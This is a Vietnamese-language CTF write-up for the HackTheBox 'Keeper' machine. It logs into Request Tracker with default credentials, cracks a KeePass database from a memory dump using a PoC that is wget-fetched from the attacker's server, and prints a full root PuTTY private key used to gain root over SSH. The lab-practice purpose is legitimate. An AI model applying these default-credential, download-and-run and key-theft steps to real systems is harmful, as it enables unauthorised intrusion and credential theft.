---
layout: post
author: Neo
title: HackTheBox - Keeper
image: /assets/img/2023-08-27-HTB-Keeper/intro.png
date: 2023-08-27
tags:
  - web
  - linux
  - ssh
  - keepass
  - hackthebox
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

## Reconnaissance and Scanning

Port scan, tôi dùng [RustScan](https://github.com/RustScan/RustScan)

```python
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Truy cập thử vào web với port 80

![web](/assets/img/2023-08-27-HTB-Keeper/1.webp)

Tôi sẽ thêm hosts để truy cập domain này

![ticket](/assets/img/2023-08-27-HTB-Keeper/2.webp)

Tôi có một vài thông tin về page này: `best practical`, `RT 4.4.4+dfsg-2ubuntu1 (Debian)`. Tìm kiếm thông tin trên gu gồ và tôi có tài khoản mặc định ở [đây](https://docs.bestpractical.com/rt/4.4.4/README.html)
Thử đăng nhập với tài khoản mặc định `root`:`password`

![rt](/assets/img/2023-08-27-HTB-Keeper/3.webp)

Dạo quanh page này, tôi tìm thấy user khác ở *Admin -> Users -> Select*

![lnorgaard](/assets/img/2023-08-27-HTB-Keeper/4.webp)

Thử đăng nhập ssh bằng user mới

## SSH

```python
┌──(root㉿kali)-[/home/kali]
└─# ssh lnorgaard@10.10.11.227 
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sun Oct 15 13:42:38 2023 from 10.10.14.61
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

Tôi có `user.txt` ở đây

## Privilege escalation

Bên cạnh `user.txt`, tôi còn 1 file zip nữa `RT30000.zip`. Unzip nó và tôi được 2 file mới

```python
lnorgaard@keeper:~$ unzip /home/lnorgaard/RT30000.zip 
Archive:  /home/lnorgaard/RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
```

Unzip được 2 file. Với file passcodes, khi tìm hiểu cách mở file này, tôi tìm được cách crack password từ file kdbx với `john`

```python
┌──(root㉿kali)-[~kali/keepass-dump-masterkey]
└─# keepass2john passcodes.kdbx > passcodes.txt  
┌──(root㉿kali)-[/home/kali/keepass-dump-masterkey]
└─# john -w=/usr/share/wordlists/rockyou.txt.gz passcodes.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it
0g 0:00:12:40 DONE (2023-10-15 13:48) 0g/s 180.5p/s 180.5c/s 180.5C/s ����ʒ:�!=*$�\3T�x#a�U�L:�-*��(>8�^Y..R��4�^o��R��)����-�lQ�{�v{AC������
Session completed. 
```

Không có kết quả.

Tìm kiếm về KeePass và dump, tôi tìm được [CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey). Clone nó về và tải nó lên máy

```python
┌──(root㉿kali)-[~kali]
└─# git clone https://github.com/CMEPW/keepass-dump-masterkey.git
Cloning into 'keepass-dump-masterkey'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), 32.52 KiB | 756.00 KiB/s, done.               
┌──(root㉿kali)-[~kali]
└─# cd keepass-dump-masterkey 
┌──(root㉿kali)-[~kali/keepass-dump-masterkey]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...

```

```python
lnorgaard@keeper:~/RT30000$ wget http://10.10.14.130:4444/poc.py
--2023-10-15 19:20:25--  http://10.10.14.130:4444/poc.py
Connecting to 10.10.14.130:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2735 (2.7K) [text/x-python]
Saving to: ‘poc.py’

poc.py                                                          100%[====================================================================================================================================================>]   2.67K  --.-KB/s    in 0.004s  

2023-10-15 19:20:25 (620 KB/s) - ‘poc.py’ saved [2735/2735]

```

```python
lnorgaard@keeper:~/RT30000$ python3 poc.py -d KeePassDumpFull.dmp
2023-10-15 19:42:03,381 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Tôi không hiểu lắm về các password này, tìm kiếm về các tool keepass trên kali tôi tìm được `keepass2`

```python
┌──(root㉿kali)-[~kali/keepass-dump-masterkey]
└─# keepass2
```

![keepass](/assets/img/2023-08-27-HTB-Keeper/5.webp)

![password](/assets/img/2023-08-27-HTB-Keeper/6.webp)

Sau khi add file kdbx, tôi cần phải nhập password. Vậy thì tôi sẽ thử nhập từng password ở phần dump đã tìm được phía trên. Tuy nhiên thì không có cái nào được. Tôi thử sao chép cái password đó lên Gu gồ và được Gu gồ gợi ý sang 1 kết quả khác

![ideas](/assets/img/2023-08-27-HTB-Keeper/7.webp)

![ideas](/assets/img/2023-08-27-HTB-Keeper/8.webp)

Đoạn đầu tiên rất giống với password của tôi nên tôi sẽ thử nó

![pass](/assets/img/2023-08-27-HTB-Keeper/9.webp)

Vẫn không được. Nhưng tôi thử viết thường tất cả thì được

![key](/assets/img/2023-08-27-HTB-Keeper/10.webp)

Tôi có 1 PuTTY key ở đây. Lưu nó về dưới tên root.ppk và sử dụng `puttygen` để generate được private key của root.

```python
┌──(root㉿kali)-[/home/kali]
└─# cat root.ppk 
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

```python
┌──(root㉿kali)-[/home/kali]
└─# puttygen root.ppk -O private-openssh -o root.pem
```

Login vào ssh

```python
┌──(root㉿kali)-[/home/kali]
└─# ssh -i root.pem root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Sun Oct 15 14:41:25 2023 from 10.10.14.61
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# ls /root
root.txt  RT30000.zip  SQL
root@keeper:~# 
```

